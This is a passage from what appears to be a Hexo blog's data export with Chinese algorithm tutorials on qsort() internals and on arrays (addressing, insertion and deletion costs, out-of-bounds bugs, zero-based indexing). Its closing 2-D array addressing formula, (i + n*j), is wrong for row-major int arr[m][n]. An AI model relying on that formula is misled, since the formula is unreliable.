2)时间复杂度的算法并不一定比O(nlogn)的算法执行时间长。</p>\n<p>我们在讲时间复杂度的时候讲过，算法的性能可以通过时间复杂度来分析，但是这种复杂度分析是比较偏理论的，如果我们深究的话，时间上时间复杂度并不等于代码的实际执行时间。</p>\n<p>时间复杂度代表的是一个增长趋势，如果画成增长曲线图，你会发现O(n^2)比O(nlogn)要陡峭，也就是说增长趋势要更猛一些。但是，我们前面讲过，在大O复杂度表示法中，我们会省略低阶、系数、常数，也就是说，O(nlogn)在没有省略低阶、系数、常数之前可能是O(knlogn + c)，而且k和c有可能还是一个比较大的数。</p>\n<p>假设k=1000， c=200，当我们对小规模数据(比如n=100)排序时，n^2 的值实际上比knlogn + c还要大小。</p>\n<p>所以对于小规模数据的排序，O(n^2)的排序算法并不一定比O(nlogn)排序算法执行的时间长。对于小数据量的排序，我们选择比较简单、不需要递归的插入排序算法。</p>\n<p>还记得我们之前讲到的哨兵来简化代码，提高执行效率吗？在qsort()插入排序的算法实现中，也利用了这种编程技巧。虽然哨兵可能只是少做一次判断，但是毕竟排序函数是非常常用、非常基础的函数，性能的优化要做到极致。</p>\n<p>好了，C语言的qsort()已经分析完了，有没有觉得其实也不是很难？基本上都是用了我们前面讲到的知识点，有了前面的知识点的积累，看一些底层的类库的时候是不是也更容易了？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天共同分析了一下如何来实现一个工业级的通用的、高效的排序函数，内容比较偏实战，而且贯穿了一些前面的章节，你要多看几遍。我们大部分排序函数都是采用O(nlogn)排序算法来实现，但是为了尽可能地提高性能，会做很多优化。</p>\n<p>我还重点讲了一下快速排序的一些优化策略，比如合理选择分区点，避免递归太深等等。最后，带你分析了一下C语言中qsort()的底层实现原理，希望你能对此有一个更加直观的感受。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-数组","date":"2018-09-09T16:18:36.000Z","mathjax":true,"_content":"\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n提到数组，我想你肯定不陌生，甚至还会自信的说他很简单。\n\n是的，在每一种编程语言中，基本都会有数组这种数据类型。尽管数组看起来非常基础、简单，但是我估计很多人都没有理解这个基础数据结构的精髓。\n\n在大部分的数据结构中，数组都是从0开始编号的，但是为什么数组要从0开始，而不是1开始呢？从1开始不是更符合人类的思维习惯吗？下面我们通过本篇文章来认识这个问题。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 数组如何实现随机访问？\n{% endnote %}\n</div>\n\n什么是数组呢？数组是一种线性表结构，它用一组连续的内存空间，来存储一组具有相同数据类型的数据。\n\n这里有几个关键词：\n\n第一是**线性表**。顾名思义，线性表就是数据像一条线一样的结构。每个线性表上的数据最多只有前后两个方向。除了数组，链表、队列、栈等也是线性表结构。\n\n与线性表相对应的概念是**非线性表**，比如二叉树、堆、图，之所以叫非线性，是因为在非线性表中，数据之间并不是简单的前后关系。\n\n第二个是**连续的内存空间和相同类型的数据**。正是因为这两个限制，所以才有一个堪称杀手锏的特性：“随机访问”。但有利就有弊，这两个限制也让数组的很多操作变得非常低效，比如在数组中插入、删除一个数据，为了保证连续性，就需要做大量的数据搬移工作。\n\n说到数据的随机访问，那么数组是如何实现很具下标随机访问数组元素的吗？\n\n我们拿一个长度为10的int类型的数组int[] a = new int[10] 来举例。在如下图中，假设计算机给数组a[10] 分配了一块连续的内存空间000-039，其中首地址为000。\n\n{% asset_img 数组.jpg 数组 %}\n我们知道计算机会给每个内存单元分配一个地址，计算机通过地址来访问内存中的数据。当计算机需要随机访问某个数组元素时，它会通过寻址公式，计算出该元素的内存地址。\n\n<div style=\"text-align: center;\">\n{% cq %} \n$$ a[i]\\\\\\_address = base\\\\\\_address + i \\* data\\\\\\_type\\\\\\_size $$\n{% endcq %}\n</div>\n\n其中base address表示数组的基地址，data_type_size表示数组中的每个元素的大小，在这个例子中，数组中存储的int类型，所以data_type_size就是4个字节。\n\n很多人在面试中回答数组和链表的区别都会这么说：“链表适合插入、删除，时间复杂度为 O(1)；数组适合查找，查找时间复杂度为O(1)”。\n实际上这种表述是不准确的。数组是适合查找操作，但是查找的复杂度并不是O(1)，即便是排好序的数组，用二分查找时间复杂度也是$O(logN)$。所以正确的表述应该是数组的随机访问的复杂度是O(1)。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 低效的“插入”和“删除”\n{% endnote %}\n</div>\n前面我们提到，数组为了保持内存数据的连续性，会导致插入、删除操作比较低效，现在我们就来看看究竟为什么会导致低效？\n\n#### 插入操作\n\n假设数组的长度为n，现在需要将一个数据插入到数组中的第k个位置。为了把第k个位置腾出来，我们需要将k-n这部分的元素都往后顺挪一位。\n\n如果是在数组的末尾插入元素，那就不需要移动数据，时间复杂度为O(1)；但是如果在数组开头插入一个元素，那所有的元素都需要后移一位，所以最坏时间复杂度为O(n)；因为在每个位置插入元素的概率是一样的，所以平均时间复杂度为$ (1+2+3+...+n)/n = O(n) $ 。 所以对于插入的时间复杂度：最好的O(1)，最坏O(n)，平均O(n)。\n\n如果数组中的元素是有序的，并且插入新元素也要保证数组有序，那么就必须按照刚才的方法移动数据。但是如果数组中存储的数据没有任何规律，只是被当来存储数据的集合，那么如果在k处插入一个数据，可以将k处的数据移到数组的末尾，然后替换k处数据为要插入的数据，这种插入处理技巧可以将时间复杂度降为O(1)。\n\n#### 删除操作\n\n跟插入数据类似，如果要删除第k个位置的数据，为了保持内存的连续性，也需要搬迁数据，不然数组中间就会出现断层，内存就不连续了。\n\n和插入类似，如果删除数组末尾的数据，则是最好时间复杂度为O(1)；如果删除开头的数据，则最坏时间复杂度为O(n)，平均情况时间复杂度也为O(n)。\n\n实际上，在某些特殊场景下，我们并不一定追求数组中数据的连续性，如果我们将多次删除操作集中在一起执行，删除的效率是不是会提高很多呢？\n\n我们继续来看一个例子，数组a[10]中存储了8个元素：a,b,c,d,e,f,g,h。现在我们要依次删除a,b,c这三个元素。\n\n{% asset_img 数组删除.jpg %}\n\n为了避免d,e,f,g这几个数据会被搬移三次，我们可以先记录下已删除的数据，每次的删除并不是真正的搬移数据，只是记录数据已经被删除，当数组没有更多空间存储数据事，我们再进行一次真正的删除操作，这样就大大减少了删除数据之后导致的数据迁移。\n\n如果你了解JVM，会发现，这不就是JVM的标记清除垃圾回收算法的核心思想吗？没错，数据结构和算法的魅力就在于此，<font color=red>**很多时候我们并不是要去死记硬背某个数据结构或算法，而是要学习他背后的思想和处理技巧，这些东西才是最优价值的**</font>。如果你细心留意，不管是在开发还是在架构设计中，总能找到某些数据结构和算法的影子。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 警惕数组越界问题\n{% endnote %}\n</div>\n了解数组的几个基本操作后，再来看看数据的访问越界问题。\n\n这里以一段C语言代码为例来进行说明：\n\n```C\nint main(int argc, char* argv[]){\n\tint i = 0;\n\tint arr[3] = {0};\n\tfor(i; i<=3; i++){\n\t\tarr[i] = 0;\n\t\tprintf(\"hello world\\n\");\n\t}\n\treturn 0;\n}\n```\n\n你发现问题了吗？这段代码并不是打印三行\"hello world\"，而是会无限打印\"hello world\"，这是为什么呢？\n\n我们知道数组大小为3，分别为a[0]、a[1]、a[2]，而我们代码因为书写错误，for循环结束条件错写为了i<=3而非i<3，所以当i=3时，数组访问越界。\n\n我们知道，在C语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。而根据我们前面讲的寻址公式，a[3]也会被定位到一个某块不属于数组的内存地址上，而在C语言的内存管理中，在局部变量分配空间的顺序是跟变量的声明顺序直接相关，同时按照内存由高到低的顺序进行空间分配，所以在内存布局中，i变量的地址刚好是在数组arr之后的一个字，所以在循环体中，将arr[3]赋值为0，实际上却是将计数器i的值设为0，这就导致了该函数的死循环。\n\n关于C语言中编译器关于变量的内存分配顺序可以看此篇文章理解一下: [https://blog.csdn.net/liuhuiyi/article/details/7526889](https://blog.csdn.net/liuhuiyi/article/details/7526889)\n\n数组越界在C语言中是一种未决行为，并没有规定数组访问越界编译器应该如何处理。因为数组访问的本质就是访问一段连续的内存地址，只要数组通过偏移计算得到的内存地址是可用的，那么程序就不会报错。\n\n所以在这种情况下，一般会出现莫名其妙的错误，而且很多计算机病毒也是利用了代码中数组越界可以访问到非法地址的漏洞，来攻击系统，所以代码中一定要警惕数组的越界访问。\n\n但并非所有的编程语言都想C一样，将数组越界检查交给程序员来做，像Java、Python本身就会做越界检查，比如java会抛出java.lang.ArrayIndexOutOfBoundsException的异常，Python会有IndexError: list index out of range的错误。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 容器能否完全代替数组?\n{% endnote %}\n</div>\n针对数组类型，很多语言提供了容器类。比如在java中提供了ArrayList、C++ STL中的vector等。那么在项目开发中，什么时候适合用数组，什么时候适合用容器呢？\n\n以java中ArrayList为例，ArrayList最大的优势就是可以将很多数组操作封装，比如数组的插入、删除等。另外，它还支持动态扩容，当存储空间不够时，它会自动扩容为原来的1.5倍。\n\n不过由于扩容操作涉及内存申请和数据搬移，是比较耗时的，因此如果事先能确定存储数据的大小，最好在创建ArrayList时实现指定数据的大小。\n\n作为高级语言编程者，是不是数组就无用武之地了呢？当然不是，有时候用数组会更合适些。\n\n1、Java ArrayList无法存储基本类型，需要封装为Long、Integer等包装类类型，因此存在一定的拆装箱上的性能损耗，如果特别关注性能，或者要使用基本类型，则可以选择数组。\n\n2、如果事先知道数据的大小，并且对数据的操作非常简单，用不到ArrayList提供的大部分方法，也可以使用数组。\n\n对于业务开发，直接使用容器就足够了，省时省力，毕竟一丢丢的性能损耗，不会影响到系统整体的性能，但是如果做一些非常底层的开发，这个时候数组就会优于容器，成为首选。\n\n\n#### 解答开篇\n\n为什么数组的索引是从0开始，而不是从1开始呢？\n\n从数组存储的内存模型来看，\"下标\"即索引最确切的定义应该是\"偏移(offset)\"，如果用arr表示数组的首地址，a[0]就是偏移为0的位置，也就是首地址，a[k]表示偏移k个type_size的位置，所以计算a[k]的内存地址只需要根据如下公式计算即可\n$$ a[k]\\\\\\_address = base\\\\\\_address + k \\* type\\\\\\_size $$\n\n但是如果数组从1开始计数，那我们计算a[k]的内存地址计算公式就会变为：\n$$ a[k]\\\\\\_address = base\\\\\\_address + (k-1) \\* type\\\\\\_size $$\n\n对比两个公式，从1开始的话，每次随机访问数组元素就多了一次减法指令。数组作为非常基础的数据结构，通过下标随机访问数组元素又是非常基础的操作，效率的优化就要尽可能做到极致。所以为了减少一次减法操作指令，数组选择了从小标从0开始，而不是从1开始。\n\n不过解释的再多，我认为都算不上压倒性的证明，说数组编号非从0开始不可，最主要的原因可能是历史原因。\n\nC语言设计者用0开始计数数组下标之后，Java、JavaScript等高级语言都效仿了C语言，或者说为了在一定程度上减少C语言程序学习Java的成本，继续沿用了从0开始计数的习惯。但是仍有很多语言中数组并不是从0开始的，比如Matlab。甚至还有一些语言支持负数下标，比如python。\n\n\n#### 思考题\n\n1、在数组的删除操作中，提到了JVM的标记清除垃圾回收算法的核心理念，如果熟悉Java、JVM，回顾下JVM的标记清除垃圾回收算法。\n2、上面讲到一维数组的寻址公式，类比一下，二维数组的内存寻址公式是怎么样的？\n\n\n---\n##### JVM标记清除垃圾回收算法：\n\n分为两个阶段，标记和清除。在大多数主流的虚拟机中采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有GC ROOTS，将所有GC ROOTS可达对象标记为存活，只有当标记工作完成后，才会进行清理工作。\n\n该算法最大的问题是会产生连续的内存空间碎片，同时标记和回收的效率都不高，但是对于只有少量垃圾产生时可以采用此种算法。\n\n##### 二维数组的寻址公式：\n\n{% asset_img 二维数组.jpg %}\n\n根据上图,对于一个二维数组int arr[m][n]，arr[i][j]的寻址公式为：\n$$ arr[i][j]\\\\\\_address = base\\\\\\_address + (i + n\\*j)\\*data\\\\\\_type\\\\\\_size $$\n\n\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-数组.md","raw":"---\ntitle: 算法-数组\ndate: 2018-09-10 00:18:36\ntags: ['算法','数组']\ncategories: 算法\nmathjax: true\n---\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n提到数组，我想你肯定不陌生，甚至还会自信的说他很简单。\n\n是的，在每一种编程语言中，基本都会有数组这种数据类型。尽管数组看起来非常基础、简单，但是我估计很多人都没有理解这个基础数据结构的精髓。\n\n在大部分的数据结构中，数组都是从0开始编号的，但是为什么数组要从0开始，而不是1开始呢？从1开始不是更符合人类的思维习惯吗？下面我们通过本篇文章来认识这个问题。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 数组如何实现随机访问？\n{% endnote %}\n</div>\n\n什么是数组呢？数组是一种线性表结构，它用一组连续的内存空间，来存储一组具有相同数据类型的数据。\n\n这里有几个关键词：\n\n第一是**线性表**。顾名思义，线性表就是数据像一条线一样的结构。每个线性表上的数据最多只有前后两个方向。除了数组，链表、队列、栈等也是线性表结构。\n\n与线性表相对应的概念是**非线性表**，比如二叉树、堆、图，之所以叫非线性，是因为在非线性表中，数据之间并不是简单的前后关系。\n\n第二个是**连续的内存空间和相同类型的数据**。正是因为这两个限制，所以才有一个堪称杀手锏的特性：“随机访问”。但有利就有弊，这两个限制也让数组的很多操作变得非常低效，比如在数组中插入、删除一个数据，为了保证连续性，就需要做大量的数据搬移工作。\n\n说到数据的随机访问，那么数组是如何实现很具下标随机访问数组元素的吗？\n\n我们拿一个长度为10的int类型的数组int[] a = new int[10] 来举例。在如下图中，假设计算机给数组a[10] 分配了一块连续的内存空间000-039，其中首地址为000。\n\n{% asset_img 数组.jpg 数组 %}\n我们知道计算机会给每个内存单元分配一个地址，计算机通过地址来访问内存中的数据。当计算机需要随机访问某个数组元素时，它会通过寻址公式，计算出该元素的内存地址。\n\n<div style=\"text-align: center;\">\n{% cq %} \n$$ a[i]\\\\\\_address = base\\\\\\_address + i \\* data\\\\\\_type\\\\\\_size $$\n{% endcq %}\n</div>\n\n其中base address表示数组的基地址，data_type_size表示数组中的每个元素的大小，在这个例子中，数组中存储的int类型，所以data_type_size就是4个字节。\n\n很多人在面试中回答数组和链表的区别都会这么说：“链表适合插入、删除，时间复杂度为 O(1)；数组适合查找，查找时间复杂度为O(1)”。\n实际上这种表述是不准确的。数组是适合查找操作，但是查找的复杂度并不是O(1)，即便是排好序的数组，用二分查找时间复杂度也是$O(logN)$。所以正确的表述应该是数组的随机访问的复杂度是O(1)。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 低效的“插入”和“删除”\n{% endnote %}\n</div>\n前面我们提到，数组为了保持内存数据的连续性，会导致插入、删除操作比较低效，现在我们就来看看究竟为什么会导致低效？\n\n#### 插入操作\n\n假设数组的长度为n，现在需要将一个数据插入到数组中的第k个位置。为了把第k个位置腾出来，我们需要将k-n这部分的元素都往后顺挪一位。\n\n如果是在数组的末尾插入元素，那就不需要移动数据，时间复杂度为O(1)；但是如果在数组开头插入一个元素，那所有的元素都需要后移一位，所以最坏时间复杂度为O(n)；因为在每个位置插入元素的概率是一样的，所以平均时间复杂度为$ (1+2+3+...+n)/n = O(n) $ 。 所以对于插入的时间复杂度：最好的O(1)，最坏O(n)，平均O(n)。\n\n如果数组中的元素是有序的，并且插入新元素也要保证数组有序，那么就必须按照刚才的方法移动数据。但是如果数组中存储的数据没有任何规律，只是被当来存储数据的集合，那么如果在k处插入一个数据，可以将k处的数据移到数组的末尾，然后替换k处数据为要插入的数据，这种插入处理技巧可以将时间复杂度降为O(1)。\n\n#### 删除操作\n\n跟插入数据类似，如果要删除第k个位置的数据，为了保持内存的连续性，也需要搬迁数据，不然数组中间就会出现断层，内存就不连续了。\n\n和插入类似，如果删除数组末尾的数据，则是最好时间复杂度为O(1)；如果删除开头的数据，则最坏时间复杂度为O(n)，平均情况时间复杂度也为O(n)。\n\n实际上，在某些特殊场景下，我们并不一定追求数组中数据的连续性，如果我们将多次删除操作集中在一起执行，删除的效率是不是会提高很多呢？\n\n我们继续来看一个例子，数组a[10]中存储了8个元素：a,b,c,d,e,f,g,h。现在我们要依次删除a,b,c这三个元素。\n\n{% asset_img 数组删除.jpg %}\n\n为了避免d,e,f,g这几个数据会被搬移三次，我们可以先记录下已删除的数据，每次的删除并不是真正的搬移数据，只是记录数据已经被删除，当数组没有更多空间存储数据事，我们再进行一次真正的删除操作，这样就大大减少了删除数据之后导致的数据迁移。\n\n如果你了解JVM，会发现，这不就是JVM的标记清除垃圾回收算法的核心思想吗？没错，数据结构和算法的魅力就在于此，<font color=red>**很多时候我们并不是要去死记硬背某个数据结构或算法，而是要学习他背后的思想和处理技巧，这些东西才是最优价值的**</font>。如果你细心留意，不管是在开发还是在架构设计中，总能找到某些数据结构和算法的影子。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 警惕数组越界问题\n{% endnote %}\n</div>\n了解数组的几个基本操作后，再来看看数据的访问越界问题。\n\n这里以一段C语言代码为例来进行说明：\n\n```C\nint main(int argc, char* argv[]){\n\tint i = 0;\n\tint arr[3] = {0};\n\tfor(i; i<=3; i++){\n\t\tarr[i] = 0;\n\t\tprintf(\"hello world\\n\");\n\t}\n\treturn 0;\n}\n```\n\n你发现问题了吗？这段代码并不是打印三行\"hello world\"，而是会无限打印\"hello world\"，这是为什么呢？\n\n我们知道数组大小为3，分别为a[0]、a[1]、a[2]，而我们代码因为书写错误，for循环结束条件错写为了i<=3而非i<3，所以当i=3时，数组访问越界。\n\n我们知道，在C语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。而根据我们前面讲的寻址公式，a[3]也会被定位到一个某块不属于数组的内存地址上，而在C语言的内存管理中，在局部变量分配空间的顺序是跟变量的声明顺序直接相关，同时按照内存由高到低的顺序进行空间分配，所以在内存布局中，i变量的地址刚好是在数组arr之后的一个字，所以在循环体中，将arr[3]赋值为0，实际上却是将计数器i的值设为0，这就导致了该函数的死循环。\n\n关于C语言中编译器关于变量的内存分配顺序可以看此篇文章理解一下: [https://blog.csdn.net/liuhuiyi/article/details/7526889](https://blog.csdn.net/liuhuiyi/article/details/7526889)\n\n数组越界在C语言中是一种未决行为，并没有规定数组访问越界编译器应该如何处理。因为数组访问的本质就是访问一段连续的内存地址，只要数组通过偏移计算得到的内存地址是可用的，那么程序就不会报错。\n\n所以在这种情况下，一般会出现莫名其妙的错误，而且很多计算机病毒也是利用了代码中数组越界可以访问到非法地址的漏洞，来攻击系统，所以代码中一定要警惕数组的越界访问。\n\n但并非所有的编程语言都想C一样，将数组越界检查交给程序员来做，像Java、Python本身就会做越界检查，比如java会抛出java.lang.ArrayIndexOutOfBoundsException的异常，Python会有IndexError: list index out of range的错误。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 容器能否完全代替数组?\n{% endnote %}\n</div>\n针对数组类型，很多语言提供了容器类。比如在java中提供了ArrayList、C++ STL中的vector等。那么在项目开发中，什么时候适合用数组，什么时候适合用容器呢？\n\n以java中ArrayList为例，ArrayList最大的优势就是可以将很多数组操作封装，比如数组的插入、删除等。另外，它还支持动态扩容，当存储空间不够时，它会自动扩容为原来的1.5倍。\n\n不过由于扩容操作涉及内存申请和数据搬移，是比较耗时的，因此如果事先能确定存储数据的大小，最好在创建ArrayList时实现指定数据的大小。\n\n作为高级语言编程者，是不是数组就无用武之地了呢？当然不是，有时候用数组会更合适些。\n\n1、Java ArrayList无法存储基本类型，需要封装为Long、Integer等包装类类型，因此存在一定的拆装箱上的性能损耗，如果特别关注性能，或者要使用基本类型，则可以选择数组。\n\n2、如果事先知道数据的大小，并且对数据的操作非常简单，用不到ArrayList提供的大部分方法，也可以使用数组。\n\n对于业务开发，直接使用容器就足够了，省时省力，毕竟一丢丢的性能损耗，不会影响到系统整体的性能，但是如果做一些非常底层的开发，这个时候数组就会优于容器，成为首选。\n\n\n#### 解答开篇\n\n为什么数组的索引是从0开始，而不是从1开始呢？\n\n从数组存储的内存模型来看，\"下标\"即索引最确切的定义应该是\"偏移(offset)\"，如果用arr表示数组的首地址，a[0]就是偏移为0的位置，也就是首地址，a[k]表示偏移k个type_size的位置，所以计算a[k]的内存地址只需要根据如下公式计算即可\n$$ a[k]\\\\\\_address = base\\\\\\_address + k \\* type\\\\\\_size $$\n\n但是如果数组从1开始计数，那我们计算a[k]的内存地址计算公式就会变为：\n$$ a[k]\\\\\\_address = base\\\\\\_address + (k-1) \\* type\\\\\\_size $$\n\n对比两个公式，从1开始的话，每次随机访问数组元素就多了一次减法指令。数组作为非常基础的数据结构，通过下标随机访问数组元素又是非常基础的操作，效率的优化就要尽可能做到极致。所以为了减少一次减法操作指令，数组选择了从小标从0开始，而不是从1开始。\n\n不过解释的再多，我认为都算不上压倒性的证明，说数组编号非从0开始不可，最主要的原因可能是历史原因。\n\nC语言设计者用0开始计数数组下标之后，Java、JavaScript等高级语言都效仿了C语言，或者说为了在一定程度上减少C语言程序学习Java的成本，继续沿用了从0开始计数的习惯。但是仍有很多语言中数组并不是从0开始的，比如Matlab。甚至还有一些语言支持负数下标，比如python。\n\n\n#### 思考题\n\n1、在数组的删除操作中，提到了JVM的标记清除垃圾回收算法的核心理念，如果熟悉Java、JVM，回顾下JVM的标记清除垃圾回收算法。\n2、上面讲到一维数组的寻址公式，类比一下，二维数组的内存寻址公式是怎么样的？\n\n\n---\n##### JVM标记清除垃圾回收算法：\n\n分为两个阶段，标记和清除。在大多数主流的虚拟机中采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有GC ROOTS，将所有GC ROOTS可达对象标记为存活，只有当标记工作完成后，才会进行清理工作。\n\n该算法最大的问题是会产生连续的内存空间碎片，同时标记和回收的效率都不高，但是对于只有少量垃圾产生时可以采用此种算法。\n\n##### 二维数组的寻址公式：\n\n{% asset_img 二维数组.jpg %}\n\n根据上图,对于一个二维数组int arr[m][n]，arr[i][j]的寻址公式为：\n$$ arr[i][j]\\\\\\_address = base\\\\\\_address + (i + n\\*j)\\*data\\\\\\_type\\\\\\_size $$\n\n\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-数组","published":1,"updated":"2019-06-26T03:52:03.525Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2mp004so25t7hppqfxt","content":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>提到数组，我想你肯定不陌生，甚至还会自信的说他很简单。</p>\n<p>是的，在每一种编程语言中，基本都会有数组这种数据类型。尽管数组看起来非常基础、简单，但是我估计很多人都没有理解这个基础数据结构的精髓。</p>\n<p>在大部分的数据结构中，数组都是从0开始编号的，但是为什么数组要从0开始，而不是1开始呢？从1开始不是更符合人类的思维习惯吗？下面我们通过本篇文章来认识这个问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"数组如何实现随机访问？\"><a href=\"#数组如何实现随机访问？\" class=\"headerlink\" title=\"数组如何实现随机访问？\"></a>数组如何实现随机访问？</h3></div><br></div>\n\n<p>什么是数组呢？数组是一种线性表结构，它用一组连续的内存空间，来存储一组具有相同数据类型的数据。</p>\n<p>这里有几个关键词：</p>\n<p>第一是<strong>线性表</strong>。顾名思义，线性表就是数据像一条线一样的结构。每个线性表上的数据最多只有前后两个方向。除了数组，链表、队列、栈等也是线性表结构。</p>\n<p>与线性表相对应的概念是<strong>非线性表</strong>，比如二叉树、堆、图，之所以叫非线性，是因为在非线性表中，数据之间并不是简单的前后关系。</p>\n<p>第二个是<strong>连续的内存空间和相同类型的数据</strong>。正是因为这两个限制，所以才有一个堪称杀手锏的特性：“随机访问”。但有利就有弊，这两个限制也让数组的很多操作变得非常低效，比如在数组中插入、删除一个数据，为了保证连续性，就需要做大量的数据搬移工作。</p>\n<p>说到数据的随机访问，那么数组是如何实现很具下标随机访问数组元素的吗？</p>\n<p>我们拿一个长度为10的int类型的数组int[] a = new int[10] 来举例。在如下图中，假设计算机给数组a[10] 分配了一块连续的内存空间000-039，其中首地址为000。</p>\n<img src=\"/posts/2018-09-10-算法-数组/数组.jpg\" title=\"数组\">\n<p>我们知道计算机会给每个内存单元分配一个地址，计算机通过地址来访问内存中的数据。当计算机需要随机访问某个数组元素时，它会通过寻址公式，计算出该元素的内存地址。</p>\n<div style=\"text-align: center;\"><br><blockquote class=\"blockquote-center\"><p>$$ a[i]\\_address = base\\_address + i * data\\_type\\_size $$</p>\n</blockquote><br></div>\n\n<p>其中base address表示数组的基地址，data_type_size表示数组中的每个元素的大小，在这个例子中，数组中存储的int类型，所以data_type_size就是4个字节。</p>\n<p>很多人在面试中回答数组和链表的区别都会这么说：“链表适合插入、删除，时间复杂度为 O(1)；数组适合查找，查找时间复杂度为O(1)”。<br>实际上这种表述是不准确的。数组是适合查找操作，但是查找的复杂度并不是O(1)，即便是排好序的数组，用二分查找时间复杂度也是$O(logN)$。所以正确的表述应该是数组的随机访问的复杂度是O(1)。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"低效的“插入”和“删除”\"><a href=\"#低效的“插入”和“删除”\" class=\"headerlink\" title=\"低效的“插入”和“删除”\"></a>低效的“插入”和“删除”</h3></div><br></div><br>前面我们提到，数组为了保持内存数据的连续性，会导致插入、删除操作比较低效，现在我们就来看看究竟为什么会导致低效？</p>\n<h4 id=\"插入操作\"><a href=\"#插入操作\" class=\"headerlink\" title=\"插入操作\"></a>插入操作</h4><p>假设数组的长度为n，现在需要将一个数据插入到数组中的第k个位置。为了把第k个位置腾出来，我们需要将k-n这部分的元素都往后顺挪一位。</p>\n<p>如果是在数组的末尾插入元素，那就不需要移动数据，时间复杂度为O(1)；但是如果在数组开头插入一个元素，那所有的元素都需要后移一位，所以最坏时间复杂度为O(n)；因为在每个位置插入元素的概率是一样的，所以平均时间复杂度为$ (1+2+3+…+n)/n = O(n) $ 。 所以对于插入的时间复杂度：最好的O(1)，最坏O(n)，平均O(n)。</p>\n<p>如果数组中的元素是有序的，并且插入新元素也要保证数组有序，那么就必须按照刚才的方法移动数据。但是如果数组中存储的数据没有任何规律，只是被当来存储数据的集合，那么如果在k处插入一个数据，可以将k处的数据移到数组的末尾，然后替换k处数据为要插入的数据，这种插入处理技巧可以将时间复杂度降为O(1)。</p>\n<h4 id=\"删除操作\"><a href=\"#删除操作\" class=\"headerlink\" title=\"删除操作\"></a>删除操作</h4><p>跟插入数据类似，如果要删除第k个位置的数据，为了保持内存的连续性，也需要搬迁数据，不然数组中间就会出现断层，内存就不连续了。</p>\n<p>和插入类似，如果删除数组末尾的数据，则是最好时间复杂度为O(1)；如果删除开头的数据，则最坏时间复杂度为O(n)，平均情况时间复杂度也为O(n)。</p>\n<p>实际上，在某些特殊场景下，我们并不一定追求数组中数据的连续性，如果我们将多次删除操作集中在一起执行，删除的效率是不是会提高很多呢？</p>\n<p>我们继续来看一个例子，数组a[10]中存储了8个元素：a,b,c,d,e,f,g,h。现在我们要依次删除a,b,c这三个元素。</p>\n<img 